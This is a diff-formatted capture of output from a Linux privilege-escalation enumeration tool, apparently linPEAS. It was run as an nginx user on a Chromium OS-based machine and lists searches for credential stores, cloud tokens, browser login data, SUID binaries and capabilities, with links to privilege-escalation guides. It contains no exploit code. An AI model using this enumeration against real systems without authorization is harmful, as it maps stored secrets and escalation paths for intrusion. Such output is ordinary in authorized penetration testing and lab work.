+╔══════════╣ Searching kerberos conf files and tickets
+╚ https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt                                 
+kadmin was found on /usr/local/bin/kadmin                                                                           
+klist execution
+klist: No credentials cache found (filename: /tmp/krb5cc_20155)
+-rw-r--r-- 1 chronos chronos 369 Mar 12  2018 /mnt/stateful_partition/dev_image/share/examples/krb5/krb5.conf
+-rw-r--r-- 1 chronos chronos 369 Mar 12  2018 /usr/local/share/examples/krb5/krb5.conf
+tickets kerberos Not Found
+klist Not Found                                                                                                     
+                                                                                                                    
+╔══════════╣ Analyzing Knockd Files (limit 70)
+*knockd* Not Found                                                                                                  
+                                                                                                                    
+╔══════════╣ Analyzing Kibana Files (limit 70)
+kibana.y*ml Not Found                                                                                               
+                                                                                                                    
+╔══════════╣ Analyzing Elasticsearch Files (limit 70)
+The version is                                                                                                      
+elasticsearch.y*ml Not Found
+                                                                                                                    
+╔══════════╣ Searching logstash files
+ Not Found                                                                                                          
+                                                                                                                    
+╔══════════╣ Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found                                                                                      
+                                                                                                                    
+╔══════════╣ Searching AD cached hashes
+cached hashes Not Found                                                                                             
+                                                                                                                    
+╔══════════╣ Searching screen sessions
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                   
+No Sockets found in /tmp/screen/S-nginx.                                                                            
+
+╔══════════╣ Searching tmux sessions
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions                                   
+tmux Not Found                                                                                                      
+                                                                                                                    
+╔══════════╣ Analyzing CouchDB Files (limit 70)
+couchdb Not Found                                                                                                   
+                                                                                                                    
+╔══════════╣ Analyzing Redis Files (limit 70)
+redis.conf Not Found                                                                                                
+                                                                                                                    
+╔══════════╣ Searching dovecot files
+dovecot credentials Not Found                                                                                       
+                                                                                                                    
+╔══════════╣ Analyzing Mosquitto Files (limit 70)
+mosquitto.conf Not Found                                                                                            
+                                                                                                                    
+╔══════════╣ Analyzing Neo4j Files (limit 70)
+neo4j Not Found                                                                                                     
+                                                                                                                    
+╔══════════╣ Analyzing Cloud Credentials Files (limit 70)
+credentials Not Found                                                                                               
+                                                                                                                    
+credentials.db Not Found
+                                                                                                                    
+legacy_credentials.db Not Found
+                                                                                                                    
+access_tokens.db Not Found
+                                                                                                                    
+access_tokens.json Not Found
+                                                                                                                    
+accessTokens.json Not Found
+                                                                                                                    
+azureProfile.json Not Found
+                                                                                                                    
+TokenCache.dat Not Found
+                                                                                                                    
+AzureRMContext.json Not Found
+                                                                                                                    
+.bluemix Not Found
+                                                                                                                    
+╔══════════╣ Analyzing Cloud Init Files (limit 70)
+cloud.cfg Not Found                                                                                                 
+                                                                                                                    
+╔══════════╣ Analyzing CloudFlare Files (limit 70)
+.cloudflared Not Found                                                                                              
+                                                                                                                    
+╔══════════╣ Analyzing Erlang Files (limit 70)
+.erlang.cookie Not Found                                                                                            
+                                                                                                                    
+╔══════════╣ Analyzing GMV Auth Files (limit 70)
+gvm-tools.conf Not Found                                                                                            
+                                                                                                                    
+╔══════════╣ Analyzing IPSec Files (limit 70)
+lrwxrwxrwx 1 root root 40 Dec 22  2020 /etc/ipsec.secrets -> /run/l2tpipsec_vpn/current/ipsec.secrets               
+
+lrwxrwxrwx 1 root root 37 Dec 22  2020 /etc/ipsec.conf -> /run/l2tpipsec_vpn/current/ipsec.conf
+
+╔══════════╣ Analyzing IRSSI Files (limit 70)
+.irssi Not Found                                                                                                    
+                                                                                                                    
+╔══════════╣ Analyzing Keyring Files (limit 70)
+keyrings Not Found                                                                                                  
+                                                                                                                    
+*.keyring Not Found
+                                                                                                                    
+*.keystore Not Found
+                                                                                                                    
+*.jks Not Found
+                                                                                                                    
+╔══════════╣ Analyzing Filezilla Files (limit 70)
+filezilla Not Found                                                                                                 
+                                                                                                                    
+filezilla.xml Not Found
+                                                                                                                    
+recentservers.xml Not Found
+                                                                                                                    
+╔══════════╣ Analyzing Backup Manager Files (limit 70)
+storage.php Not Found                                                                                               
+                                                                                                                    
+database.php Not Found
+                                                                                                                    
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/autologin/passwd                                                                                  
+passwd file: /etc/pam.d/passwd
+passwd file: /etc/passwd
+passwd file: /usr/local/etc/passwd
+passwd file: /usr/share/baselayout/passwd
+
+╔══════════╣ Searching GitLab related files
+                                                                                                                    
+
+╔══════════╣ Analyzing Github Files (limit 70)
+drwxr-xr-x 3 chronos chronos 4096 Apr 28  2020 /mnt/stateful_partition/dev_image/lib64/ruby/gems/2.7.0/gems/rake-13.0.1/.github
+drwxr-xr-x 2 chronos chronos 4096 Jun 29  2020 /mnt/stateful_partition/dev_image/share/nodebrew/node/v8.9.4/lib/node_modules/npm/.github
+drwxr-xr-x 3 chronos chronos 4096 Apr 28  2020 /usr/local/lib64/ruby/gems/2.7.0/gems/rake-13.0.1/.github
+drwxr-xr-x 2 chronos chronos 4096 Jun 29  2020 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/.github
+
+.gitconfig Not Found
+                                                                                                                    
+.git-credentials Not Found
+                                                                                                                    
+drwxr-xr-x 8 chronos chronos 4096 Jun 28  2020 /mnt/stateful_partition/dev_image/lib/crew/.git
+drwxr-xr-x 8 chronos chronos 4096 Jun 28  2020 /usr/local/lib/crew/.git
+
+╔══════════╣ Analyzing Svn Files (limit 70)
+.svn Not Found                                                                                                      
+                                                                                                                    
+╔══════════╣ Analyzing PGP-GPG Files (limit 70)
+/usr/bin/gpg                                                                                                        
+netpgpkeys Not Found
+netpgp Not Found                                                                                                    
+*.pgp Not Found                                                                                                     
+                                                                                                                    
+*.gpg Not Found
+                                                                                                                    
+*.gnupg Not Found
+                                                                                                                    
+╔══════════╣ Analyzing Cache Vi Files (limit 70)
+*.swp Not Found                                                                                                     
+                                                                                                                    
+*.viminfo Not Found
+                                                                                                                    
+╔══════════╣ Checking if containerd(ctr) is available
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation                   
+                                                                                                                    
+╔══════════╣ Checking if runc is available
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                             
+                                                                                                                    
+╔══════════╣ Searching docker files (limit 70)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket                                
+-rw-r--r-- 1 root root 99 Dec 22  2020 /opt/neverware/browser_extensions/tests/Dockerfile                           
+-rw-r--r-- 1 root root 1070 Dec 22  2020 /opt/neverware/browser_extensions/wizard/tests/Dockerfile
+
+╔══════════╣ Analyzing Firefox Files (limit 70)
+.mozilla Not Found                                                                                                  
+                                                                                                                    
+╔══════════╣ Analyzing Chrome Files (limit 70)
+google-chrome Not Found                                                                                             
+                                                                                                                    
+╔══════════╣ Analyzing Autologin Files (limit 70)
+drwxr-xr-x 2 root root 4096 Feb  3 16:43 /etc/autologin                                                             
+
+-rw-r--r-- 1 root root 978 Feb  3 16:42 /etc/init/autologin.conf
+# Copyright 2016 The Chromium OS Authors. All rights reserved.
+# Use of this source code is governed by a BSD-style license that can be
+# found in the LICENSE file.
+description   "Automatic login at boot"
+author        "chromium-os-dev@chromium.org"
+# After boot-complete starts, the login prompt is visible and is accepting
+# input.
+start on started boot-complete
+script
+  passwd=
+  # Read password from file. The file may optionally end with a newline.
+  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
+    if [ -e "${dir}/passwd" ]; then
+      passwd="$(cat "${dir}/passwd")"
+      break
+    fi
+  done
+  if [ -z "${passwd}" ]; then
+    exit 0
+  fi
+  # Inject keys into the login prompt.
+  #
+  # For this to work, you must have already created an account on the device.
+  # Otherwise, no login prompt appears at boot and the injected keys do the
+  # wrong thing.
+  /usr/local/sbin/inject-keys.py -s "${passwd}" -k enter
+end script
+
+╔══════════╣ S/Key authentication
+                                                                                                                    
+╔══════════╣ YubiKey authentication
+                                                                                                                    
+╔══════════╣ Passwords inside pam.d
+/etc/pam.d/chromeos-auth:  /usr/bin/test -f /mnt/stateful_partition/etc/devmode.passwd                              
+/etc/pam.d/chromeos-auth:  pwdfile /mnt/stateful_partition/etc/devmode.passwd
+
+╔══════════╣ Analyzing SNMP Files (limit 70)
+snmpd.conf Not Found                                                                                                
+                                                                                                                    
+╔══════════╣ Analyzing Pypirc Files (limit 70)
+.pypirc Not Found                                                                                                   
+                                                                                                                    
+╔══════════╣ Analyzing Ldaprc Files (limit 70)
+.ldaprc Not Found                                                                                                   
+                                                                                                                    
+╔══════════╣ Analyzing Env Files (limit 70)
+.env Not Found                                                                                                      
+                                                                                                                    
+╔══════════╣ Analyzing Msmtprc Files (limit 70)
+.msmtprc Not Found                                                                                                  
+                                                                                                                    
+╔══════════╣ Analyzing Keepass Files (limit 70)
+*.kdbx Not Found                                                                                                    
+                                                                                                                    
+KeePass.config* Not Found
+                                                                                                                    
+KeePass.ini Not Found
+                                                                                                                    
+KeePass.enforced* Not Found
+                                                                                                                    
+╔══════════╣ Analyzing FTP Files (limit 70)
+*.ftpconfig Not Found                                                                                               
+                                                                                                                    
+ffftp.ini Not Found
+                                                                                                                    
+ftp.ini Not Found
+                                                                                                                    
+ftp.config Not Found
+                                                                                                                    
+sites.ini Not Found
+                                                                                                                    
+wcx_ftp.ini Not Found
+                                                                                                                    
+winscp.ini Not Found
+                                                                                                                    
+ws_ftp.ini Not Found
+                                                                                                                    
+╔══════════╣ Analyzing Bind Files (limit 70)
+drwxr-xr-x 2 chronos chronos 4096 Feb 15  2018 /mnt/stateful_partition/dev_image/include/boost/bind                 
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+
+
+drwxr-xr-x 4 chronos chronos 4096 Feb 15  2018 /mnt/stateful_partition/dev_image/include/boost/phoenix/bind
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+
+
+drwxr-xr-x 2 chronos chronos 4096 Feb 15  2018 /usr/local/include/boost/bind
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+
+
+drwxr-xr-x 4 chronos chronos 4096 Feb 15  2018 /usr/local/include/boost/phoenix/bind
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+sed: -e expression #1, char 0: no previous regular expression
+
+
+
+╔══════════╣ Analyzing SeedDMS Files (limit 70)
+seeddms* Not Found                                                                                                  
+                                                                                                                    
+╔══════════╣ Analyzing Ddclient Files (limit 70)
+ddclient.conf Not Found                                                                                             
+                                                                                                                    
+╔══════════╣ Analyzing Cacti Files (limit 70)
+cacti Not Found                                                                                                     
+                                                                                                                    
+╔══════════╣ Analyzing Interesting logs Files (limit 70)
+-rw-r--r-- 1 chronos chronos 319461 Jul 18 14:13 /mnt/stateful_partition/dev_image/share/nginx/logs/access.log      
+-rw-r--r-- 1 chronos chronos 319461 Jul 18 14:13 /usr/local/share/nginx/logs/access.log
+
+-rw-r--r-- 1 chronos chronos 61698 Jul 18 14:13 /mnt/stateful_partition/dev_image/share/nginx/logs/error.log
+-rw-r--r-- 1 chronos chronos 61698 Jul 18 14:13 /usr/local/share/nginx/logs/error.log
+
+╔══════════╣ Analyzing Windows Files Files (limit 70)
+unattend.inf Not Found                                                                                              
+                                                                                                                    
+*.rdg Not Found
+                                                                                                                    
+AppEvent.Evt Not Found
+                                                                                                                    
+ConsoleHost_history.txt Not Found
+                                                                                                                    
+FreeSSHDservice.ini Not Found
+                                                                                                                    
+NetSetup.log Not Found
+                                                                                                                    
+Ntds.dit Not Found
+                                                                                                                    
+protecteduserkey.bin Not Found
+                                                                                                                    
+RDCMan.settings Not Found
+                                                                                                                    
+SAM Not Found
+                                                                                                                    
+SYSTEM Not Found
+                                                                                                                    
+SecEvent.Evt Not Found
+                                                                                                                    
+appcmd.exe Not Found
+                                                                                                                    
+bash.exe Not Found
+                                                                                                                    
+datasources.xml Not Found
+                                                                                                                    
+default.sav Not Found
+                                                                                                                    
+drives.xml Not Found
+                                                                                                                    
+groups.xml Not Found
+                                                                                                                    
+https-xampp.conf Not Found
+                                                                                                                    
+https.conf Not Found
+                                                                                                                    
+iis6.log Not Found
+                                                                                                                    
+index.dat Not Found
+                                                                                                                    
+my.cnf Not Found
+                                                                                                                    
+my.ini Not Found
+                                                                                                                    
+ntuser.dat Not Found
+                                                                                                                    
+pagefile.sys Not Found
+                                                                                                                    
+-rw-r--r-- 1 chronos chronos 73657 Jun 11  2020 /mnt/stateful_partition/dev_image/etc/php.ini
+-rw-r--r-- 1 chronos chronos 73657 Jun 11  2020 /usr/local/etc/php.ini
+
+printers.xml Not Found
+                                                                                                                    
+recentservers.xml Not Found
+                                                                                                                    
+scclient.exe Not Found
+                                                                                                                    
+scheduledtasks.xml Not Found
+                                                                                                                    
+security.sav Not Found
+                                                                                                                    
+server.xml Not Found
+                                                                                                                    
+setupinfo Not Found
+                                                                                                                    
+setupinfo.bak Not Found
+                                                                                                                    
+sitemanager.xml Not Found
+                                                                                                                    
+sites.ini Not Found
+                                                                                                                    
+software Not Found
+                                                                                                                    
+software.sav Not Found
+                                                                                                                    
+sysprep.inf Not Found
+                                                                                                                    
+sysprep.xml Not Found
+                                                                                                                    
+drwxr-xr-x 4 chronos chronos 4096 Nov 22  2019 /mnt/stateful_partition/dev_image/etc/systemd/system
+drwxr-xr-x 3 chronos chronos 4096 Feb 15  2018 /mnt/stateful_partition/dev_image/include/boost/system
+drwxr-xr-x 2 chronos chronos 4096 Jun 29  2020 /mnt/stateful_partition/dev_image/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/cli-table2/node_modules/colors/lib/system
+drwxr-xr-x 239 chronos chronos 12288 Apr 28  2020 /mnt/stateful_partition/dev_image/share/ri/2.7.0/system
+drwxr-xr-x 4 chronos chronos 4096 Nov 22  2019 /usr/local/etc/systemd/system
+drwxr-xr-x 3 chronos chronos 4096 Feb 15  2018 /usr/local/include/boost/system
+drwxr-xr-x 2 chronos chronos 4096 Jun 29  2020 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/cli-table2/node_modules/colors/lib/system
+drwxr-xr-x 239 chronos chronos 12288 Apr 28  2020 /usr/local/share/ri/2.7.0/system
+
+system.sav Not Found
+                                                                                                                    
+unattend.txt Not Found
+                                                                                                                    
+unattend.xml Not Found
+                                                                                                                    
+unattended.xml Not Found
+                                                                                                                    
+wcx_ftp.ini Not Found
+                                                                                                                    
+ws_ftp.ini Not Found
+                                                                                                                    
+web*.config Not Found
+                                                                                                                    
+winscp.ini Not Found
+                                                                                                                    
+wsl.exe Not Found
+                                                                                                                    
+╔══════════╣ Analyzing Other Interesting Files Files (limit 70)
+-rw-r--r-- 1 root root 551 Dec 22  2020 /etc/skel/.bashrc                                                           
+-rw-r--r-- 1 katie katie 551 Dec 22  2020 /home/katie/.bashrc
+-rw-r--r-- 1 nginx nginx 551 Dec 22  2020 /home/nginx/.bashrc
+-rw-r--r-- 1 katie katie 551 Dec 22  2020 /mnt/stateful_partition/home/katie/.bashrc
+-rw-r--r-- 1 nginx nginx 551 Dec 22  2020 /mnt/stateful_partition/home/nginx/.bashrc
+
+.google_authenticator Not Found
+                                                                                                                    
+hosts.equiv Not Found
+                                                                                                                    
+.lesshst Not Found
+                                                                                                                    
+.plan Not Found
+                                                                                                                    
+.profile Not Found
+                                                                                                                    
+.recently-used.xbel Not Found
+                                                                                                                    
+.rhosts Not Found
+                                                                                                                    
+.sudo_as_admin_successful Not Found
+                                                                                                                    
+
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                    
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                         
+-rws--x--- 1 root messagebus  31K Dec 22  2020 /usr/libexec/dbus-daemon-launch-helper                               
+-rws--x--- 1 root power       18K Jan 15  2021 /usr/bin/powerd_setuid_helper (Unknown SUID binary)
+-rwsr-xr-x 1 root root       563K Feb 11 01:04 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                         
+                                                                                                                    
+╔══════════╣ Checking misconfigurations of ld.so
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so                                                 
+/etc/ld.so.conf                                                                                                     
+# ld.so.conf autogenerated by env-update; make all changes to
+# contents of /etc/env.d directory
+/lib64
+/usr/lib64
+/usr/local/lib64
+/lib
+/usr/lib
+/usr/local/lib
+/usr/lib/llvm/lib64
+
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                          
+Current capabilities:                                                                                               
+Current: =
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+Shell capabilities:
+0x0000000000000000=
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+
+Files with capabilities (limited to 50):
+/usr/bin/fusermount = cap_sys_admin+ep
+/bin/arping = cap_net_raw+ep
+/bin/ping = cap_net_raw+ep
+
+╔══════════╣ Users with capabilities
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                          
+/etc/security/capability.conf Not Found                                                                             
+                                                                                                                    
+╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls                                                  
+files with acls in searched folders Not Found                                                                       
+                                                                                                                    
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                               
+/usr/local/bin/gettext.sh                                                                                           
+/usr/sbin/kernel_log_collector.sh
+/usr/sbin/write_gpt.sh
+/usr/bin/start_bluetoothd.sh
+/usr/bin/unix-lpr.sh
+/usr/bin/start_bluetoothlog.sh
+/usr/bin/get_bluetooth_device_class.sh
+/usr/bin/crosh.sh
+/usr/bin/amuFormat.sh
+/usr/bin/lprsetup.sh
+
+╔══════════╣ Unexpected in root
+/postinst                                                                                                           
+
+╔══════════╣ Files (scripts) in /etc/profile.d/
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files                                        
+total 20                                                                                                            
+drwxr-xr-x  2 root root 4096 Jan 15  2021 .
+drwxr-xr-x 63 root root 4096 Feb 11 10:24 ..
+-rw-r--r--  1 root root  487 Dec 22  2020 cursor.sh
+-rw-r--r--  1 root root  813 Dec 22  2020 flatpak.sh
+-rw-r--r--  1 root root   46 Dec 22  2020 xauthority.sh
+
+╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d                          
+                                                                                                                    
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ No                                                                        
+═╣ Credentials in fstab/mtab? ........... No                                                                        
+═╣ Can I read shadow files? ............. No                                                                        
+═╣ Can I read opasswd file? ............. No                                                                        
+═╣ Can I write in network-scripts? ...... No                                                                        
+═╣ Can I read root folder? .............. No                                                                        
+                                                                                                                    
+╔══════════╣ Searching root files in home dirs (limit 30)
+/home/                                                                                                              
+/home/user
+/home/chronos/.oobe_completed
+/home/.shadow
+/home/nginx/.bash_history
+/home/katie/.bash_history
+/home/root
+/root/
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+                                                                                                                    
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+                                                                                                                    
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/home/nginx/.gnupg/trustdb.gpg                                                                                      
+/home/nginx/.gnupg/pubring.gpg
+/home/nginx/.gnupg/gpg.conf
+/mnt/stateful_partition/encrypted.block
+/mnt/stateful_partition/home/nginx/.gnupg/trustdb.gpg
+/mnt/stateful_partition/home/nginx/.gnupg/pubring.gpg
+/mnt/stateful_partition/home/nginx/.gnupg/gpg.conf
+/mnt/stateful_partition/encrypted/var/log/messages
+/mnt/stateful_partition/encrypted/var/log/vmware-vmsvc-root.log
+/mnt/stateful_partition/encrypted/var/log/net.log
+/mnt/stateful_partition/encrypted/var/log/vmlog/vmlog.20210718-210321
+/mnt/stateful_partition/encrypted/var/log/update_engine/update_engine.20210718-140311
+/mnt/stateful_partition/encrypted/var/log/secure
+/mnt/stateful_partition/encrypted/var/log/journal/00000000000000000000000000000001/system.journal
+/mnt/stateful_partition/encrypted/var/lib/metrics/Platform.DailyUseTime
+/mnt/stateful_partition/encrypted/var/lib/metrics/Platform.UserCrashInterval
+/mnt/stateful_partition/encrypted/var/lib/metrics/Platform.AnyCrashesDaily
+/mnt/stateful_partition/encrypted/var/lib/metrics/Platform.CumulativeCpuTime
+/mnt/stateful_partition/encrypted/var/lib/metrics/Platform.CumulativeUseTime
+/mnt/stateful_partition/encrypted/var/lib/metrics/Platform.UserCrashesWeekly
+/mnt/stateful_partition/encrypted/var/lib/metrics/Platform.AnyCrashesWeekly
+/mnt/stateful_partition/encrypted/var/lib/metrics/uma-events
+/mnt/stateful_partition/encrypted/var/lib/metrics/Platform.UserCrashesDaily
+/mnt/stateful_partition/encrypted/var/lib/metrics/Platform.KernelCrashInterval
+/var/log/messages
+/var/log/vmware-vmsvc-root.log
+/var/log/net.log
+/var/log/vmlog/vmlog.20210718-210321
+/var/log/update_engine/update_engine.20210718-140311
+/var/log/secure
+/var/log/journal/00000000000000000000000000000001/system.journal
+
+╔══════════╣ Writable log files (logrotten) (limit 100)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation                                
+logrotate Not Found                                                                                                 
+                                                                                                                    
+╔══════════╣ Files inside /home/nginx (limit 20)
+total 36                                                                                                            
+drwxr-xr-x 6 nginx nginx 4096 Jul 18 14:23 .
+drwxr-xr-x 8 root  root  4096 Feb  2 15:55 ..
+lrwxrwxrwx 1 root  root     9 Feb  4 12:41 .bash_history -> /dev/null
+-rw-r--r-- 1 nginx nginx  127 Dec 22  2020 .bash_logout
+-rw-r--r-- 1 nginx nginx  204 Dec 22  2020 .bash_profile
+-rw-r--r-- 1 nginx nginx  551 Dec 22  2020 .bashrc
+drwx------ 2 nginx nginx 4096 Jul 18 14:23 .gnupg
+drwx------ 3 nginx nginx 4096 Jan 15  2021 .pki
+drwx------ 2 nginx nginx 4096 Jan 15  2021 .ssh
+drwxr-xr-x 2 nginx nginx 4096 Jan 15  2021 log
+
+╔══════════╣ Files inside others home (limit 20)
+/home/chronos/startup_settings_cache.json                                                                           
+/home/chronos/BrowserMetrics-spare.pma
+/home/chronos/CrashpadMetrics-active.pma
+/home/chronos/.oobe_completed
+/home/chronos/Safe Browsing Cookies
+/home/chronos/Default/Media History
+/home/chronos/Default/Favicons-journal
+/home/chronos/Default/Network Persistent State
+/home/chronos/Default/previews_opt_out.db-journal
+/home/chronos/Default/Media History-journal
+/home/chronos/Default/History-journal
+/home/chronos/Default/Visited Links
+/home/chronos/Default/Web Data-journal
+/home/chronos/Default/heavy_ad_intervention_opt_out.db-journal
+/home/chronos/Default/Favicons
+/home/chronos/Default/Login Data
+/home/chronos/Default/Web Data
+/home/chronos/Default/heavy_ad_intervention_opt_out.db
+/home/chronos/Default/Login Data-journal
+/home/chronos/Default/Preferences
+
+╔══════════╣ Searching installed mail applications
+                                                                                                                    
+╔══════════╣ Mails (limit 50)
+                                                                                                                    
+╔══════════╣ Backup folders
+                                                                                                                    
+╔══════════╣ Backup files (limited 100)
+-rw-r--r-- 1 chronos chronos 7141 Jan  2  2018 /usr/local/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/form-data/README.md.bak
+-rw-r--r-- 1 root root 4733 Feb 11 10:24 /usr/local/share/doc/open-vm-tools/api/html/vmbackup_8h.html
+-rw-r--r-- 1 root root 6376 Feb 11 10:24 /usr/local/share/doc/open-vm-tools/api/html/vmbackup_8h_source.html
+-rw-r--r-- 1 chronos chronos 339 Apr 28  2020 /usr/local/share/ri/2.7.0/system/Bundler/EnvironmentPreserver/backup-i.ri
+-rw-r--r-- 1 chronos chronos 2760 Nov 26  2017 /usr/local/share/man/man8/vgcfgbackup.8.gz
+-rw-r--r-- 1 chronos chronos 235 Dec 28  2017 /usr/local/docs/README_tokudb_backup
+-rwxr-xr-x 1 chronos chronos 68056 Feb 17  2018 /usr/local/lib/mysql/plugin/tokudb_backup.so
+-rwxr-xr-x 1 root root 173120 Feb 11 10:24 /usr/local/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 chronos chronos 5671 Mar 29  2020 /usr/local/lib/python3.8/sqlite3/test/backup.py
+-rw-r--r-- 1 chronos chronos 6999 Mar 29  2020 /usr/local/lib/python3.8/sqlite3/test/__pycache__/backup.cpython-38.opt-2.pyc
